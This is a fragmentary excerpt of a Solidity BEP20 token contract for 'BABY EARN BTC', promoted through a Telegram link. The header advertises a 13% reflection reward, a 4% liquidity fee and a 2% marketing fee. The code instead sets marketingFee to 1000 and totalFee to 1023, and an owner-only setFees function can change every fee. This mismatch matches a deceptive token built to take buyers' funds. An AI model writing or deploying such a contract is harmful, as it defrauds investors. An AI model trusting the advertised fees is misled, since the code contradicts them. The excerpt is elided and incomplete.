...
REFLECTION REWARD : 13% OF BTC
FEE LIQIUDITY : 4%
MARKETING FEE : 2%
LIQIUDITY START : AROUND 0.5-1 BNB
https://t.me/babyearnbtc
*/
...
contract BABYEARNBTC is IBEP20, Auth {
    using SafeMath for uint256;

    address public EARNBTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "BABY EARN BTC";
    string constant _symbol = "Baby BTC";
    ...
    uint256 public reflectionRewardBTCB = 13;
    uint256 marketingFee = 1000;
    uint256 totalFee = 1023;
    ...
    constructor () Auth(msg.sender) {
        ...
        address _presaler = 0xFC56D873E8Cf96c389CF0F673A9ba448CC2a7418;
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBReflection = amountBNB.mul(reflectionRewardBTCB).div(totalBNBFee);
    ...
    function setFees(uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external authorized {
        ...
        reflectionRewardBTCB = _reflectionFee;
